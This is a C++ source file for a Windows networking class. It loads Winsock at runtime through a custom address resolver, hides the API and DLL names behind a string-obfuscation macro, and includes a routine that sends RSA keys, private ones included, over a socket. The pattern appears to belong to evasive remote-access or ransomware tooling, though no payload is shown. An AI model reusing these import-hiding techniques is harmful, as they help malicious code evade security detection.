#include "NetworkManager.h"
#include "ProcessManager.h"
#include "ext/obfuscate.h"

#include <vector>

bool NetworkManager::TransmitRSAKey(SOCKET s, RSA* key, bool isPrivateKey) {
    if ( !key )
        return false;

    DER format = LGCrypto::RSAKeyToDer(key, isPrivateKey);
    if ( Send(s, ( char* ) &format.len, sizeof(format.len), 0) <= 0 )
        return false;
    
    if ( Send(s, ( char* ) format.data, format.len, 0) <= 0 )
        return false;

    return true;
}

NetworkManager::NetworkManager() {
    if ( this->m_WSAInitialized )
        return;

#ifdef SERVER_RELEASE
    if ( !DllsLoaded ) {
        Kernel32DLL = LoadLibraryA("kernel32.dll");
        NTDLL = LoadLibraryA("ntdll.dll");
        AdvApi32DLL = LoadLibraryA("advapi32.dll");
        DllsLoaded = true;
    }
#endif

    // load winsock and kernel32 libraries

    HMODULE WINSOCK = ProcessManager::GetFunctionAddress<_LoadLibrary>(Kernel32DLL, std::string(HIDE("LoadLibraryA")))( ( char* ) HIDE("Ws2_32.dll") );

    //// function pointers from winsock
    StartWSA = ProcessManager::GetFunctionAddress<_WSAStartup>(WINSOCK, std::string(HIDE("WSAStartup")));
    BindSocket = ProcessManager::GetFunctionAddress<_bind>(WINSOCK, std::string(HIDE("bind")));
    CloseSocket = ProcessManager::GetFunctionAddress<_closesocket>(WINSOCK, std::string(HIDE("closesocket")));
    CreateSocket = ProcessManager::GetFunctionAddress<_socket>(WINSOCK, std::string(HIDE("socket")));
    Receive = ProcessManager::GetFunctionAddress<_recv>(WINSOCK, std::string(HIDE("recv")));
    SendTo = ProcessManager::GetFunctionAddress<_sendto>(WINSOCK, std::string(HIDE("sendto")));
    ReceiveFrom = ProcessManager::GetFunctionAddress<_recvfrom>(WINSOCK, std::string(HIDE("recvfrom")));
    Send = ProcessManager::GetFunctionAddress<_send>(WINSOCK, std::string(HIDE("send")));
    CleanWSA = ProcessManager::GetFunctionAddress<_WSACleanup>(WINSOCK, std::string(HIDE("WSACleanup")));
    ConnectSocket = ProcessManager::GetFunctionAddress<_connect>(WINSOCK, std::string(HIDE("connect")));
    SocketListen = ProcessManager::GetFunctionAddress<_listen>(WINSOCK, std::string(HIDE("listen")));
    ShutdownSocket = ProcessManager::GetFunctionAddress<_shutdown>(WINSOCK, std::string(HIDE("shutdown")));
    AcceptOnSocket = ProcessManager::GetFunctionAddress<_accept>(WINSOCK, std::string(HIDE("accept")));
    HostToNetworkShort = ProcessManager::GetFunctionAddress<_htons>(WINSOCK, std::string(HIDE("htons")));
    InternetAddress = ProcessManager::GetFunctionAddress<_inet_addr>(WINSOCK, std::string(HIDE("inet_addr")));
    GetHostByName = ProcessManager::GetFunctionAddress<_gethostbyname>(WINSOCK, std::string(HIDE("gethostbyname")));
    HostToNetworkLong = ProcessManager::GetFunctionAddress<_htonl>(WINSOCK, std::string(HIDE("htonl")));
    NetworkToHostLong = ProcessManager::GetFunctionAddress<_ntohl>(WINSOCK, std::string(HIDE("ntohl")));
    SetSocketOptions = ProcessManager::GetFunctionAddress<_setsocketopt>(WINSOCK, std::string(HIDE("setsockopt")));


    WORD    version = MAKEWORD(2, 2);
    WSAData data = { 0 };

    if ( StartWSA(version, &data) == 0 ) {
        this->m_WSAInitialized = true;
    }
}

void NetworkManager::SetSocketTimeout(SOCKET s, int timeoutMS, int type) {
    SetSocketOptions(s, SOL_SOCKET, type, ( char* ) &timeoutMS, sizeof(timeoutMS));
}

void NetworkManager::ResetSocketTimeout(SOCKET s, int type) {
    SetSocketTimeout(s, 0, type);
}